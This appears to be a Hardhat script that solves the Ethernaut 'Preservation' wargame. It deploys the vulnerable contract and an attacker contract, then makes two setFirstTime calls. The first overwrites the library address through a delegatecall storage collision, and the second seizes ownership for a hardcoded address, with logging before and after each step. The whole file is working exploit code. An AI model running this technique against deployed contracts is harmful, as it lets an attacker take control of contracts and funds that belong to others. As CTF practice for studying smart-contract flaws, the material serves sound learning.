
const hre = require("hardhat");

async function main() {
  const myPublicKey = "0xF60Ba5a095EFAFA71c4c71e3E0C0c09Bcc76FEf4";

  const LibraryContract1 = await hre.ethers.getContractFactory("LibraryContract");
  const libraryContract1 = await LibraryContract1.deploy();
  
  console.log("LibraryContract1 deployed to:", libraryContract1.address);

  const LibraryContract2 = await hre.ethers.getContractFactory("LibraryContract");
  const libraryContract2 = await LibraryContract2.deploy();
  
  console.log("LibraryContract2 deployed to:", libraryContract2.address);

  const Preservation = await hre.ethers.getContractFactory("Preservation");
  const preservation = await Preservation.deploy(libraryContract1.address, libraryContract2.address);

  console.log("Preservation deployed to:", preservation.address);

  const PreservationAttacker = await hre.ethers.getContractFactory("PreservationAttacker");
  const preservationAttacker = await PreservationAttacker.deploy();

  console.log("Preservation Attacker deployed to:", preservationAttacker.address);

  console.log("Preservation owner:", await preservation.owner());
  console.log("Preservation timeZone1Library:", await preservation.timeZone1Library());

  const attackerAddressAsUint = await preservationAttacker.getAdressAsUint(preservationAttacker.address);
  await preservation.setFirstTime(attackerAddressAsUint);

  console.log("Preservation owner 2:", await preservation.owner());
  console.log("Preservation timeZone1Library 2:", await preservation.timeZone1Library());

  const myAddressAsUint =  await preservationAttacker.getAdressAsUint(myPublicKey);
  await preservation.setFirstTime(myAddressAsUint);

  console.log("Preservation owner 3:", await preservation.owner());
  console.log("Preservation timeZone1Library 3:", await preservation.timeZone1Library());
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
